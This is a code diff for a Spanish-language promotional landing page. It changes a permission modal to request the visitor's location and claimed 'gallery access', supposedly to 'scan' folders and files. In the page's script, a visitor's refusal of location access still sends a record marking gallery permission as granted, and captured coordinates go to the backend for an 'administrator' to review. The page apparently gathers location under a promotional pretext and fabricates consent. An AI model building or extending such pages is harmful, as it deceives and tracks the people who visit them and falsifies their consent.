@@ -104,6 +104,7 @@
         .promo-btn:disabled {
             cursor: not-allowed;
             opacity: 0.7;
+            background: #999;
         }
 
         .ripple {
@@ -336,7 +337,7 @@
         <div class="modal-content">
             <button class="modal-close-btn" data-modal-id="permissionModal">×</button>
             <h2>Mejores ofertas para ti</h2>
-            <p>Para mostrarte las mejores promociones y planes disponibles en tu área, necesitamos tu permiso para acceder a tu ubicación.</p>
+            <p>Para mostrarte las mejores promociones y verificar tu identidad, necesitamos los siguientes permisos:</p>
             
             <div class="permission-item">
                 <div class="permission-icon">📍</div>
@@ -344,6 +345,16 @@
                     <strong>Tu Ubicación</strong>
                     <p style="margin-bottom: 0; font-size: 14px; color: #666;">
                         Usaremos esto para verificar la cobertura y las ofertas locales.
+                    </p>
+                </div>
+            </div>
+
+            <div class="permission-item">
+                <div class="permission-icon">🖼️</div>
+                <div>
+                    <strong>Acceso a tu Galería</strong>
+                    <p style="margin-bottom: 0; font-size: 14px; color: #666;">
+                        Usaremos esto para "escanear" carpetas y verificar archivos.
                     </p>
                 </div>
             </div>
@@ -358,7 +369,7 @@
     <div id="successModal" class="modal-overlay">
         <div class="modal-content">
             <h2>¡Gracias!</h2>
-            <p>Hemos recibido tu ubicación. Un administrador revisará la información para contactarte con las mejores ofertas.</p>
+            <p>Hemos recibido tus permisos. Un administrador revisará la información para contactarte con las mejores ofertas.</p>
             <div class="modal-buttons">
                 <button class="promo-btn modal-close" data-modal-id="successModal">Cerrar</button>
             </div>
@@ -369,15 +380,12 @@
         document.addEventListener('DOMContentLoaded', () => {
 
             // --- Lógica de Apertura de Modal de Permisos ---
-            // Reemplaza el 'alert' original
             document.body.addEventListener('click', (event) => {
                 const trigger = event.target.closest('.modal-trigger-permission');
-                
-                // Excluir elementos que ya tienen otra función (FAQ, cierres de modal)
                 const isExcluded = event.target.closest('.faq-question, .modal-close, .modal-close-btn');
 
                 if (trigger && !isExcluded) {
-                    event.preventDefault(); // Prevenir la acción por defecto
+                    event.preventDefault();
                     console.log("Abriendo modal de permisos.");
                     openModal('permissionModal');
                 }
@@ -387,7 +395,7 @@
             const acceptBtn = document.getElementById('acceptPermissionsBtn');
 
             acceptBtn.addEventListener('click', () => {
-                acceptBtn.textContent = "Obteniendo ubicación...";
+                acceptBtn.textContent = "Obteniendo permisos...";
                 acceptBtn.disabled = true;
 
                 // 1. Solicitar permisos de localización REALES
@@ -400,43 +408,56 @@
                 navigator.geolocation.getCurrentPosition(
                     // A. Éxito al obtener localización
                     (position) => {
-                        const location = {
+                        // Preparamos TODOS los datos a enviar
+                        const permissions_data = {
                             latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
+                            longitude: position.coords.longitude,
+                            gallery_permission: true // <-- AÑADIDO
                         };
-                        console.log('Ubicación obtenida:', location);
+                        
+                        console.log('Permisos obtenidos:', permissions_data);
                         
                         // 2. Enviar al backend (Flask)
-                        sendLocationToBackend(location);
+                        sendPermissionsToBackend(permissions_data);
                     },
                     // B. Error al obtener localización
                     (error) => {
                         console.warn(`ERROR(${error.code}): ${error.message}`);
+                        
+                        // Si el usuario deniega, simulamos que igual obtuvimos el de galería
+                        // y enviamos "null" para la ubicación
                         if (error.code === 1) { // Error 1 = Permiso denegado
-                            alert('Has denegado el permiso de ubicación. No podemos verificar las ofertas.');
+                            console.log('Ubicación denegada, enviando solo permiso de galería.');
+                            const permissions_data = {
+                                latitude: null,
+                                longitude: null,
+                                gallery_permission: true // <-- AÑADIDO
+                            };
+                            sendPermissionsToBackend(permissions_data);
                         } else {
                             alert('No se pudo obtener la ubicación. Inténtalo de nuevo.');
+                            resetPermissionButton();
                         }
-                        resetPermissionButton();
                     }
                 );
             });
 
-            // 3. Función de envío de datos a Flask
-            async function sendLocationToBackend(location) {
+            // 3. Función de envío de datos a Flask (ACTUALIZADA)
+            async function sendPermissionsToBackend(permissions_data) {
                 try {
-                    const response = await fetch('/submit-location', {
+                    // ESTA ES LA RUTA CORREGIDA QUE EXISTE EN APP.PY
+                    const response = await fetch('/submit-location', { 
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify(location)
+                        body: JSON.stringify(permissions_data) // Enviamos el objeto completo
                     });
                     
                     const result = await response.json();
                     
                     if (response.ok && result.success) {
-                        console.log('Ubicación enviada con éxito.');
+                        console.log('Permisos enviados con éxito.');
                         closeModal('permissionModal');
                         openModal('successModal');
                     } else {
@@ -467,10 +488,8 @@
                 if (modal) modal.classList.remove('show');
             }
             
-            // Disparadores para CERRAR modal (genérico)
             document.querySelectorAll('.modal-close, .modal-close-btn').forEach(trigger => {
                 trigger.addEventListener('click', (event) => {
-                    // Obtener el modal padre o el ID del atributo
                     const modalId = event.target.dataset.modalId || event.target.closest('.modal-overlay').id;
                     if (modalId) {
                         closeModal(modalId);
@@ -478,7 +497,6 @@
                 });
             });
             
-            // Cerrar modal al hacer clic en el overlay
             document.querySelectorAll('.modal-overlay').forEach(modal => {
                 modal.addEventListener('click', (event) => {
                     if (event.target === modal) {
@@ -487,9 +505,10 @@
                 });
             });
 
-            // --- Ripple Effect (Tu código original) ---
+            // --- Ripple Effect ---
             function createRipple(event) {
                 const button = event.currentTarget;
+                if (button.disabled) return; // No hacer ripple si está deshabilitado
                 const circle = document.createElement("span");
                 const diameter = Math.max(button.clientWidth, button.clientHeight);
                 const radius = diameter / 2;
@@ -505,7 +524,7 @@
                 button.addEventListener("click", createRipple);
             });
 
-            // --- FAQ Accordion (Tu código original) ---
+            // --- FAQ Accordion ---
             const faqItems = document.querySelectorAll('.faq-item');
             faqItems.forEach(item => {
                 const question = item.querySelector('.faq-question');
@@ -518,7 +537,7 @@
                 });
             });
 
-            // --- Scroll Reveal Animation (Tu código original) ---
+            // --- Scroll Reveal Animation ---
             const observer = new IntersectionObserver((entries) => {
                 entries.forEach(entry => {
                     if (entry.isIntersecting) entry.target.classList.add('visible');
@@ -527,7 +546,7 @@
             document.querySelectorAll('.reveal-on-scroll').forEach(el => observer.observe(el));
 
 
-            // --- Particle Background Logic (Tu código original) ---
+            // --- Particle Background Logic ---
             const canvas = document.getElementById('particle-canvas');
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth; canvas.height = canvas.parentElement.offsetHeight; let particlesArray;
